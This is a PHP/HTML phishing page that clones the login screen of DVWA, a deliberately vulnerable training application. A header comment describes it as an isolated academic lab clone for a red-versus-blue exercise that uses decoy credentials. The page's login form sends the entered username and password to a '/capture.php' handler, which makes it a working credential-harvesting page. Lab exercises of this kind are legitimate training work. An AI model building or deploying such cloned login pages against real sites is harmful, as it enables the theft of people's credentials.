<?php /* LAB PHISHING CLONE — uso académico aislado, solo credenciales señuelo. Escenario B Red vs Blue. */ ?>
<!DOCTYPE html>

<html lang="en-GB">

	<head>

		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />

		<title>Login :: Damn Vulnerable Web Application (DVWA)</title>

		<link rel="stylesheet" type="text/css" href="http://127.0.0.1:8080/dvwa/css/login.css" />

	</head>

	<body>

	<div id="wrapper">

	<div id="header">

	<br />

	<p><img src="http://127.0.0.1:8080/dvwa/images/login_logo.png" /></p>

	<br />

	</div> <!--<div id="header">-->

	<div id="content">

	<form action="/capture.php" method="post">

	<fieldset>

			<label for="user">Username</label> <input type="text" class="loginInput" size="20" name="username"><br />


			<label for="pass">Password</label> <input type="password" class="loginInput" AUTOCOMPLETE="off" size="20" name="password"><br />

			<br />

			<p class="submit"><input type="submit" value="Login" name="Login"></p>

	</fieldset>

	

	</form>

	<br />

	

	<br />
	<br />
	<br />
	<br />
	<br />
	<br />
	<br />
	<br />

	</div > <!--<div id="content">-->

	<div id="footer">

	<p><a href="#">Damn Vulnerable Web Application (DVWA)</a></p>

	</div> <!--<div id="footer"> -->

	</div> <!--<div id="wrapper"> -->

	</body>

</html>